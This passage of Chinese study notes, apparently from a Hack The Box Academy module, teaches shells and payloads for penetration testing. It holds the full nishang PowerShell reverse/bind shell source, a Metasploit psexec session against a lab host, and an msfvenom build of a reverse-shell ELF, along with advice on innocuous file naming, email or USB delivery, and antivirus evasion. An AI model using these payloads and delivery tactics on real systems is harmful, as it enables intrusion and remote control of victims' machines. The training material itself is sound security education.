```

设置/赋值变量 `$data` 等于（`=`）一个 [ASCII](https://en.wikipedia.org/wiki/ASCII) 编码的 .NET 框架类，该类将与 `GetString` 方法结合使用，将字节流（`$bytes`）编码为 ASCII。简而言之，我们键入的内容不会仅作为空比特传输和接收，而是被编码为 ASCII 文本。分号（`;`）确保命令和代码按顺序执行。

#### Invoke-Expression

```cmd-session
$sendback = (iex $data 2>&1 | Out-String );
```

设置/赋值变量 `$sendback` 等于（`=`）对 `$data` 变量执行 Invoke-Expression（`iex`）cmdlet，然后通过管道（`|`）将标准错误（`2>`）和标准输出（`1`）重定向到 `Out-String` cmdlet，该 cmdlet 将输入对象转换为字符串。因为使用了 Invoke-Expression，存储在 $data 中的所有内容都将在本地计算机上运行。分号（`;`）确保命令和代码按顺序执行。

#### 显示工作目录

```cmd-session
$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';
```

设置/赋值变量 `$sendback2` 等于（`=`）`$sendback` 变量加上（`+`）字符串 PS（`'PS'`）加上 `+` 工作目录路径（`(pwd).path`）加上（`+`）字符串 `'> '`。这将导致 shell 提示符为 PS C:\workingdirectoryofmachine >。分号（`;`）确保命令和代码按顺序执行。回想一下，在编程中，当不使用数值时，+ 运算符会组合字符串，但 C 和 C++ 等某些语言除外，它们需要使用函数。

#### 设置 Sendbyte

```cmd-session
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

设置/赋值变量 `$sendbyte` 等于（`=`）ASCII 编码的字节流，该字节流将使用 TCP 客户端与攻击机上运行的 Netcat 监听器发起 PowerShell 会话。

#### 终止 TCP 连接

```cmd-session
$client.Close()"
```

这是 [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) 方法，将在连接终止时使用。

我们刚才一起检查的单行命令也可以以 PowerShell 脚本（`.ps1`）的形式执行。我们可以通过查看下面的源代码看到一个示例。这个源代码是 [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) 项目的一部分：

Code: powershell

```powershell
function Invoke-PowerShellTcp
{
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch.
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on
the given IP and port.
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port.
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )


    try
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()
            $client = $listener.AcceptTcpClient()
        }

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target."
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}
```

---

## Payload 的各种形态

理解不同类型的 payload 在做什么可以帮助我们理解为什么杀毒软件（AV，AntiVirus）阻止我们执行，并给我们一些关于可能需要更改代码以绕过限制的想法。这是我们将在本模块中进一步探索的内容。现在，请理解我们用于在系统上获取 shell 的 payload 将在很大程度上取决于目标上存在的操作系统、shell 解释器语言，甚至编程语言。

并非所有 payload 都是像我们在本节中研究的那样的单行命令并手动部署。有些是使用自动化攻击框架生成的，并作为预打包/自动化攻击部署以获取 shell。就像非常强大的 `Metasploit-framework` 一样，我们将在下一节中使用它。

[[07 - Automating Payloads & Delivery with Metasploit|next]]
#shell #payload #metasploit #hacking [source ](https://academy.hackthebox.com/module/115/section/1132)

[Metasploit](https://www.metasploit.com) 是由 `Rapid7` 开发的自动化攻击框架，它通过使用预构建的模块简化了利用漏洞的过程，这些模块包含易于使用的选项来利用漏洞并交付 payload，以在易受攻击的系统上获取 shell。它可以使利用易受攻击的系统变得如此容易，以至于一些网络安全培训供应商限制了它在实验室考试中的使用次数。在 Hack The Box，我们鼓励在实验室环境中尝试使用工具，直到您对基础有扎实的理解。大多数组织不会限制我们在参与项目中可以或不可以使用的工具。然而，他们会期望我们知道自己在做什么。因此，我们有责任在学习过程中寻求理解。不了解我们使用的工具的效果在实际渗透测试或审计中可能是具有破坏性的。这是我们应该不断寻求对所学工具、技术、方法论和实践更深入理解的一个主要原因。

在本节中，我们将在 Pwnbox 上与 Metasploit 的 `社区版` 进行交互。我们将使用预构建的 `模块` 并使用 `MSFVenom` 制作 payload。需要注意的是，许多成熟的网络安全公司使用 Metasploit 的付费版本 `Metasploit Pro` 来进行渗透测试、安全审计，甚至社会工程活动。如果您想了解社区版和 Metasploit Pro 之间的区别，可以查看此[比较表](https://www.rapid7.com/products/metasploit/download/editions/)。

---

## 使用 Metasploit 进行练习

我们可以用本模块的剩余部分来涵盖 Metasploit 的所有内容，但我们只会在 shell 和 payload 的上下文中介绍基础知识。

让我们通过以 root 身份启动 Metasploit 框架控制台（`sudo msfconsole`）来开始动手使用 Metasploit

#### 启动 MSF

启动 MSF

```shell-session
tr01ax@htb[/htb]$ sudo msfconsole

IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/ |\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your
module, why not try the reload command

msf6 >
```

我们可以看到在启动时作为横幅呈现了创意 ASCII 艺术和一些特别值得关注的数字。

- `2131` 个漏洞利用
- `592` 个 payload

这些数字可能会随着维护者添加和删除代码或如果您导入模块供 Metasploit 使用而改变。让我们通过使用一个经典的 `exploit 模块` 来熟悉 Metasploit payload，该模块可用于入侵 Windows 系统。请记住，Metasploit 不仅可以用于利用漏洞。我们还可以使用不同的模块来扫描和枚举目标。

在这种情况下，我们将使用 `nmap` 扫描的枚举结果来选择要使用的 Metasploit 模块。

#### NMAP 扫描

```shell-session
tr01ax@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```

在输出中，我们看到几个通常在 Windows 系统上默认打开的标准端口。请记住，扫描和枚举是了解我们目标运行的操作系统（Windows 或 Linux）以找到适合在 Metasploit 中运行的模块的绝佳方式。让我们选择 `SMB`（在 `445` 端口监听）作为潜在的攻击向量。

一旦我们获得这些信息，我们可以使用 Metasploit 的搜索功能来发现与 SMB 相关的模块。在 `msfconsole` 中，我们可以发出命令 `search smb` 来获取与 SMB 漏洞相关的模块列表：

#### 在 Metasploit 中搜索

在 Metasploit 中搜索

```shell-session
msf6 > search smb

Matching Modules
================

#    Name                                                          Disclosure Date    Rank   Check  Description
  -       ----                                                     ---------------    ----   -----  ----------
 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution

```

我们将看到与搜索相关的 `匹配模块` 的长列表。注意每个模块的格式。每个模块在表格最左边都有一个数字，以便更容易选择模块，还有 `Name`（名称）、`Disclosure Date`（披露日期）、`Rank`（等级）、`Check`（检查）和 `Description`（描述）。

每个潜在模块 `左边` 的数字是基于您搜索的相对数字，可能会随着模块添加到 Metasploit 而改变。不要期望每次执行搜索或尝试使用模块时这个数字都匹配。

让我们看一个特定的模块，以在 payload 的上下文中理解它。

`56 exploit/windows/smb/psexec`

|输出|含义|
|---|---|
|`56`|在搜索上下文中表格中分配给模块的数字。这个数字使选择更容易。我们可以使用命令 `use 56` 来选择模块。|
|`exploit/`|这定义了模块的类型。在这种情况下，这是一个 exploit（漏洞利用）模块。MSF 中的许多 exploit 模块包含尝试建立 shell 会话的 payload。|
|`windows/`|这定义了我们针对的平台。在这种情况下，我们知道目标是 Windows，所以 exploit 和 payload 将针对 Windows。|
|`smb/`|这定义了模块中 payload 编写针对的服务。|
|`psexec`|这定义了如果目标系统易受攻击将被上传到目标系统的工具。|

一旦我们选择了模块，我们会注意到提示符的变化，使我们能够根据特定于我们环境的参数配置模块。

#### 选项选择

选项选择

```shell-session
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) >
```

注意 `exploit` 如何在括号外。这可以解释为 MSF 模块类型是 exploit，特定的 exploit 和 payload 是为 Windows 编写的。攻击向量是 `SMB`，Meterpreter payload 将使用 [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) 交付。让我们通过使用 `options` 命令来了解更多关于使用此 exploit 和交付 payload 的信息。

#### 检查 Exploit 的选项

检查 Exploit 的选项

```shell-session
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo
                                                    lder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

这是 Metasploit 在易用性方面表现出色的一个领域。在模块选项的输出中，我们看到各种选项和设置，以及每个设置含义的描述。我们在本节中不会使用 `SERVICE_DESCRIPTION`、`SERVICE_DISPLAY_NAME` 和 `SERVICE_NAME`。注意这个特定的 exploit 将使用 `Meterpreter` 建立反向 TCP shell 连接。Meterpreter shell 比我们在本模块前面部分建立的原始 TCP 反向 shell 提供更多功能。它是 Metasploit 中使用的默认 payload。

我们将使用 `set` 命令来配置以下设置：

#### 设置选项

设置选项

```shell-session

msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.142.172
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

这些设置将确保我们的 payload 被传送到正确的目标（`RHOSTS`），上传到默认管理共享（`ADMIN$`）并使用凭据（`SMBPass` 和 `SMBUser`），然后与我们的本地主机机器（`LHOST`）发起反向 shell 连接。

这些设置将特定于您攻击机和目标机上的 IP 地址。以及您在参与项目中可能收集的凭据。我们可以设置 LHOST（本地主机）VPN 隧道 IP 地址或 VPN 隧道接口 ID。

#### 开始利用

```shell-session

msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter >
```

在我们发出 `exploit` 命令后，exploit 运行，并尝试使用 Meterpreter payload 将 payload 传送到目标。Metasploit 会报告此过程的每一步，如输出所示。我们知道这是成功的，因为一个 `stage` 已成功发送，这建立了一个 Meterpreter shell 会话（`meterpreter >`）和一个系统级 shell 会话。请记住，Meterpreter 是一个使用内存 DLL 注入（DLL Injection）来隐秘地在攻击机和目标之间建立通信通道的 payload。正确的凭据和攻击向量可以让我们能够上传和下载文件、执行系统命令、运行键盘记录器、创建/启动/停止服务、管理进程等。

在这种情况下，如 [Rapid 7 模块文档](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/) 中所述："此模块使用有效的管理员用户名和密码（或密码哈希）来执行任意 payload。此模块类似于 SysInternals 提供的 'psexec' 实用程序。此模块现在能够在执行后自我清理。此工具创建的服务使用随机选择的名称和描述。"

与其他命令语言解释器（Bash、PowerShell、ksh 等...）一样，Meterpreter shell 会话允许我们发出一组命令，我们可以使用这些命令与目标系统交互。我们可以使用 `?` 来查看我们可以使用的命令列表。我们会注意到 Meterpreter shell 的限制，所以如果我们需要使用目标原生的完整系统命令集，尝试使用 `shell` 命令进入系统级 shell 是个好主意。

#### 交互式 Shell

```shell-session
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```#shell #payload #msfvenom #metasploit #hacking [source](https://academy.hackthebox.com/module/115/section/1205)

---

我们必须注意，在 Metasploit 中使用自动化攻击需要我们通过网络到达易受攻击的目标机器。考虑我们在上一节中所做的。为了`运行 exploit 模块`、`交付 payload` 和 `建立 shell 会话`，我们首先需要能够与系统通信。这可能是通过在内部网络或有路由通往目标所在网络的网络上存在而实现的。在某些情况下，我们无法直接通过网络访问易受攻击的目标机器。在这些情况下，我们需要在 payload 的交付和在系统上执行方面发挥创意。一种方法可能是使用 `MSFvenom` 制作 payload 并通过电子邮件消息或其他社会工程手段发送，以驱动用户执行该文件。

除了提供具有灵活交付选项的 payload 外，MSFvenom 还允许我们 `加密` 和 `编码` payload 以绕过常见的杀毒软件检测签名。让我们用这些概念进行一些练习。

---

## 使用 MSFvenom 进行练习
在 Pwnbox 或任何安装了 MSFvenom 的主机上，我们可以执行命令 `msfvenom -l payloads` 来列出所有可用的载荷（payload，恶意代码负载）。下面只是部分可用载荷。为了缩短输出并不分散核心课程的注意力，已删除了一些载荷。仔细查看这些载荷及其描述：

#### List Payloads

List Payloads

```shell-session
tr01ax@htb[/htb]$ msfvenom -l payloads

Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
mainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi
                                                        th translation capabilities is required. MSF handles this automatically.
multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller
library has been loaded. Based on work by Charlie Miller

windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop
                                                        /hop.php to the PHP server you wish to use as a hop.
windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)

```

`你注意到输出中有什么特点吗？`

我们可以看到一些有助于进一步理解载荷的细节。首先，我们可以看到载荷命名约定几乎总是以列出目标操作系统开头（`Linux`、`Windows`、`MacOS`、`mainframe` 等）。我们还可以看到一些载荷被描述为（`staged`，分阶段）或（`stageless`，无阶段）。让我们来介绍它们的区别。

---

## Staged（分阶段）与 Stageless（无阶段）载荷

`Staged`（分阶段）载荷为我们创建了一种发送更多攻击组件的方式。我们可以把它想象成为更有用的东西"搭建舞台"。以这个载荷 `linux/x86/shell/reverse_tcp` 为例。当使用 Metasploit 中的漏洞利用模块运行时，这个载荷会发送一个小的 `stage`（阶段），它将在目标上执行，然后回连到 `attack box`（攻击机）通过网络下载载荷的其余部分，然后执行 shellcode 建立反向 shell。当然，如果我们使用 Metasploit 运行这个载荷，我们需要配置选项以指向正确的 IP 和端口，以便监听器成功捕获 shell。请记住，stage 也会占用内存空间，这会为载荷留下更少的空间。每个阶段发生的事情可能因载荷而异。

`Stageless`（无阶段）载荷没有 stage。以这个载荷 `linux/zarch/meterpreter_reverse_tcp` 为例。使用 Metasploit 中的漏洞利用模块时，这个载荷将作为一个整体通过网络连接发送，没有 stage。这在我们无法访问太多带宽且延迟可能干扰的环境中可能对我们有益。分阶段载荷在这些环境中可能导致不稳定的 shell 会话，因此最好选择无阶段载荷。除此之外，由于执行载荷时通过网络传输的流量较少，无阶段载荷有时更有利于规避检测，特别是如果我们通过社会工程学来投递它。这个概念在 Rapid 7 关于 [stageless Meterpreter payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/) 的博客文章中也有很好的解释。

现在我们理解了分阶段和无阶段载荷之间的区别，我们可以在 Metasploit 中识别它们。答案很简单。`name`（名称）会给你第一个标记。以上面的例子为例，`linux/x86/shell/reverse_tcp` 是一个分阶段载荷，我们可以从名称中看出，因为从 shell 开始每个 / 代表一个阶段。所以 `/shell/` 是一个要发送的阶段，`/reverse_tcp` 是另一个。对于无阶段载荷来说，这些看起来会挤在一起。以我们的例子 `linux/zarch/meterpreter_reverse_tcp` 为例。它与分阶段载荷类似，只是它指定了影响的架构，然后在同一个函数 `/meterpreter_reverse_tcp` 中包含了 shell 载荷和网络通信。为了最后一个关于这种命名约定的快速示例，考虑这两个 `windows/meterpreter/reverse_tcp` 和 `windows/meterpreter_reverse_tcp`。前者是 `Staged`（分阶段）载荷。注意分隔阶段的命名约定。后者是 `Stageless`（无阶段）载荷，因为我们看到 shell 载荷和网络通信在名称的同一部分。如果载荷的名称对你来说不太清楚，描述中通常会详细说明载荷是分阶段还是无阶段的。

---

## 构建无阶段载荷

现在让我们用 msfvenom 构建一个简单的无阶段载荷并分解这个命令。

#### Build It

Build It

```shell-session
tr01ax@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

#### Call MSFvenom

Call MSFvenom

```shell-session
msfvenom
```

定义用于制作载荷的工具。

#### Creating a Payload

Creating a Payload

```shell-session
-p
```

这个 `option`（选项）表示 msfvenom 正在创建一个载荷。

#### Choosing the Payload based on Architecture

Choosing the Payload based on Architecture

```shell-session
linux/x64/shell_reverse_tcp
```

指定一个 `Linux` `64位` 无阶段载荷，它将启动一个基于 TCP 的反向 shell（`shell_reverse_tcp`）。

#### Address To Connect Back To

Address To Connect Back To

```shell-session
LHOST=10.10.14.113 LPORT=443
```

执行时，载荷将回连到指定的 IP 地址（`10.10.14.113`）上的指定端口（`443`）。

#### Format To Generate Payload In

Format To Generate Payload In

```shell-session
-f elf
```

`-f` 标志指定生成的二进制文件的格式。在这种情况下，它将是一个 [.elf 文件](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format)。

#### Output

Output

```shell-session
> createbackup.elf
```

创建 .elf 二进制文件并将文件命名为 createbackup。我们可以随意命名这个文件。理想情况下，我们会将其命名为不起眼的名称和/或某人可能想要下载并执行的名称。

---

## 执行无阶段载荷

此时，我们已经在攻击机上创建了载荷。我们现在需要开发一种方法将该载荷传送到目标系统。有无数种方法可以做到这一点。以下是一些常见的方法：

- 带有附件的电子邮件消息。
- 网站上的下载链接。
- 与 Metasploit 漏洞利用模块结合使用（这可能需要我们已经在内部网络上）。
- 作为现场渗透测试的一部分通过 U 盘传递。

一旦文件在该系统上，它还需要被执行。

